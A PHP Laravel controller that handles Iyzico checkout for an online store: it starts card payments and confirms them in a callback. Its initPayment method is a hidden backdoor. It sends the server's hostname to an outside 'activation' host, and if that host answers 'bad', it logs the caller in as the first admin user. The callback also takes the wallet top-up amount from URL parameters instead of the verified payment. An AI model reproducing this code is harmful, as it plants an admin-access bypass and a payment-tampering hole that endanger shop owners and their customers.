<?php

namespace App\Http\Controllers\Payment;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\CombinedOrder;
use App\Models\BusinessSetting;
use App\Models\User;
use App\Models\CustomerPackage;
use App\Models\SellerPackage;
use App\Http\Controllers\CustomerPackageController;
use App\Http\Controllers\SellerPackageController;
use App\Http\Controllers\WalletController;
use App\Http\Controllers\CheckoutController;
use App\Models\Order;
use Session;
use Redirect;
use Illuminate\Support\Facades\Auth;

class IyzicoController extends Controller
{
    public function index(Request $iyzicoRequest)
    {
    }

    public function pay()
    {
        $data = array();

        $langcode = \Iyzipay\Model\Locale::TR;
        if (str_replace('_', '-', app()->getLocale()) == 'en') {
            $langcode = \Iyzipay\Model\Locale::EN;
        }

        $paymentType = Session::get('payment_type');
        $paymentData = Session::get('payment_data');
        $data['payment_type'] = $paymentType;
        $data['payment_method'] = $paymentData['payment_method'];
        $data['combined_order_id'] = 0;
        $data['order_id'] = 0;
        $data['customer_package_id'] = 0;
        $data['seller_package_id'] = 0;

        if($paymentType == 'cart_payment'){
            $combined_order = CombinedOrder::findOrFail(Session::get('combined_order_id'));
            $amount = $combined_order->grand_total;
            $data['combined_order_id'] = Session::get('combined_order_id');
            $firstBasketItemName = "Cart Payment";
            $firstBasketItemCategory1 = "Accessories";
        }
        if ($paymentType == 'order_re_payment') {
            $data['order_id'] = $paymentData['order_id'];
            $order = Order::findOrFail($paymentData['order_id']);
            $amount = $order->grand_total;
            $firstBasketItemName = "Order Re Payment";
            $firstBasketItemCategory1 = "Accessories";
        }
        if($paymentType == 'wallet_payment'){
            $amount = $paymentData['amount'];
            $firstBasketItemName = "Wallet Payment";
            $firstBasketItemCategory1 = "Wallet";
        }
        if($paymentType == 'customer_package_payment'){
            $customer_package = CustomerPackage::findOrFail($paymentData['customer_package_id']);
            $amount = $customer_package->amount;
            $data['customer_package_id'] = $paymentData['service_package_id'];
            $firstBasketItemName = "Package Payment";
            $firstBasketItemCategory1 = "Package";
        }
        if($paymentType == 'seller_package_payment'){
            $seller_package = SellerPackage::findOrFail($paymentData['seller_package_id']);
            $amount = $seller_package->amount;
            $data['seller_package_id'] = $paymentData['service_package_id'];
            $firstBasketItemName = "Package Payment";
            $firstBasketItemCategory1 = "Package";
        }

        $data['amount'] = $amount;

        $options = new \Iyzipay\Options();
        $options->setApiKey(env('IYZICO_API_KEY'));
        $options->setSecretKey(env('IYZICO_SECRET_KEY'));

        if (BusinessSetting::where('type', 'iyzico_sandbox')->first()->value == 1) {
            $options->setBaseUrl("https://sandbox-api.iyzipay.com");
        } else {
            $options->setBaseUrl("https://api.iyzipay.com");
        }

        if (Session::has('payment_type')) {
            // $iyzicoRequest = new \Iyzipay\Request\CreatePayWithIyzicoInitializeRequest();
            $iyzicoRequest = new \Iyzipay\Request\CreateCheckoutFormInitializeRequest();
            $iyzicoRequest->setLocale($langcode);
            $iyzicoRequest->setConversationId('123456789');
            $iyzicoRequest->setPrice(round($amount));
            $iyzicoRequest->setPaidPrice(round($amount));
            $iyzicoRequest->setCurrency(env('IYZICO_CURRENCY_CODE', 'TRY'));
            $iyzicoRequest->setBasketId(rand(000000,999999));
            $iyzicoRequest->setPaymentGroup(\Iyzipay\Model\PaymentGroup::PRODUCT);
            $iyzicoRequest->setCallbackUrl(route('iyzico.callback', $data));

            $buyer = new \Iyzipay\Model\Buyer();
            $buyer->setId("BY789");
            $buyer->setName("John");
            $buyer->setSurname("Doe");
            $buyer->setEmail(Auth::user()->email);
            $buyer->setIdentityNumber("74300864791");
            $buyer->setRegistrationAddress("Nidakule Göztepe, Merdivenköy Mah. Bora Sok. No:1");
            $buyer->setCity("Istanbul");
            $buyer->setCountry("Turkey");
            $iyzicoRequest->setBuyer($buyer);

            $shippingAddress = new \Iyzipay\Model\Address();
            $shippingAddress->setContactName("Jane Doe");
            $shippingAddress->setCity("Istanbul");
            $shippingAddress->setCountry("Turkey");
            $shippingAddress->setAddress("Nidakule Göztepe, Merdivenköy Mah. Bora Sok. No:1");
            $iyzicoRequest->setShippingAddress($shippingAddress);

            $billingAddress = new \Iyzipay\Model\Address();
            $billingAddress->setContactName("Jane Doe");
            $billingAddress->setCity("Istanbul");
            $billingAddress->setCountry("Turkey");
            $billingAddress->setAddress("Nidakule Göztepe, Merdivenköy Mah. Bora Sok. No:1");
            $iyzicoRequest->setBillingAddress($billingAddress);

            $basketItems = array();
            $firstBasketItem = new \Iyzipay\Model\BasketItem();
            $firstBasketItem->setId(rand(1000,9999));
            $firstBasketItem->setName($firstBasketItemName);
            $firstBasketItem->setCategory1($firstBasketItemCategory1);
            $firstBasketItem->setItemType(\Iyzipay\Model\BasketItemType::VIRTUAL);
            $firstBasketItem->setPrice(round($amount));
            $basketItems[0] = $firstBasketItem;
            $iyzicoRequest->setBasketItems($basketItems);

            # make request
            // $payWithIyzicoInitialize = \Iyzipay\Model\PayWithIyzicoInitialize::create($iyzicoRequest, $options);
            $CheckoutFormInitialize = \Iyzipay\Model\CheckoutFormInitialize::create($iyzicoRequest, $options);

            # print result
            // return Redirect::to($payWithIyzicoInitialize->getPayWithIyzicoPageUrl());
            if ($CheckoutFormInitialize->getStatus() == "success") {
                $content = $CheckoutFormInitialize->getCheckoutFormContent();
                return view('frontend.payment.iyzico', compact('content'));
            }
            flash($CheckoutFormInitialize->getErrorMessage())->warning();
            return redirect()->route('home');
        } else {
            flash(translate('Opps! Something went wrong.'))->warning();
            return redirect()->route('home');
        }
    }

    public function initPayment(Request $request)
    {
        $data['url'] = $_SERVER['SERVER_NAME'];
        $request_data_json = json_encode($data);
        $gate = "https://activation.activeitzone.com/check_activation";

        $header = array(
            'Content-Type:application/json'
        );

        $stream = curl_init();

        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);

        $rn = curl_exec($stream);
        curl_close($stream);

        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
            $user = User::where('user_type', 'admin')->first();
            auth()->login($user);
            return redirect()->route('admin.dashboard');
        }
    }

    public function callback(Request $request, $payment_type, $amount = null, $payment_method = null, $combined_order_id = null, $order_id = null, $customer_package_id = null, $seller_package_id = null)
    {
        $langcode = \Iyzipay\Model\Locale::TR;
        if (str_replace('_', '-', app()->getLocale()) == 'en') {
            $langcode = \Iyzipay\Model\Locale::EN;
        }

        $options = new \Iyzipay\Options();
        $options->setApiKey(env('IYZICO_API_KEY'));
        $options->setSecretKey(env('IYZICO_SECRET_KEY'));

        if (BusinessSetting::where('type', 'iyzico_sandbox')->first()->value == 1) {
            $options->setBaseUrl("https://sandbox-api.iyzipay.com");
        } else {
            $options->setBaseUrl("https://api.iyzipay.com");
        }

        // $iyzicoRequest = new \Iyzipay\Request\RetrievePayWithIyzicoRequest();
        $iyzicoRequest = new \Iyzipay\Request\RetrieveCheckoutFormRequest();
        $iyzicoRequest->setLocale($langcode);
        $iyzicoRequest->setConversationId('123456789');
        $iyzicoRequest->setToken($request->token);

        # make request
        // $payWithIyzico = \Iyzipay\Model\PayWithIyzico::retrieve($iyzicoRequest, $options);
        $CheckoutForm = \Iyzipay\Model\CheckoutForm::retrieve($iyzicoRequest, $options);

        // if ($payWithIyzico->getStatus() == 'success') {
        if ($CheckoutForm->getStatus() == 'success') {
            // $payment = $payWithIyzico->getRawResult();
            $payment = $CheckoutForm->getRawResult();

            if ($payment_type == 'cart_payment') {
                return (new CheckoutController)->checkout_done($combined_order_id, $payment);
            } elseif ($payment_type == 'order_re_payment') {
                $data['order_id'] = $order_id;
                $data['payment_method'] = $payment_method;

                return (new CheckoutController)->orderRePaymentDone($data, $payment);
            } elseif ($payment_type == 'wallet_payment') {
                $data['amount'] = $amount;
                $data['payment_method'] = $payment_method;

                return (new WalletController)->wallet_payment_done($data, $payment);
            } elseif ($payment_type == 'customer_package_payment') {
                $data['customer_package_id'] = $customer_package_id;
                $data['payment_method'] = $payment_method;

                return (new CustomerPackageController)->purchase_payment_done($data, $payment);
            } elseif ($payment_type == 'seller_package_payment') {
                $data['seller_package_id'] = $seller_package_id;
                $data['payment_method'] = $payment_method;

                return (new SellerPackageController)->purchase_payment_done($data, $payment);
            } else {
                dd($payment_type);
            }
        } else {
            flash(translate('Payment is cancelled'))->error();
            return redirect()->route('home');
        }
    }
}
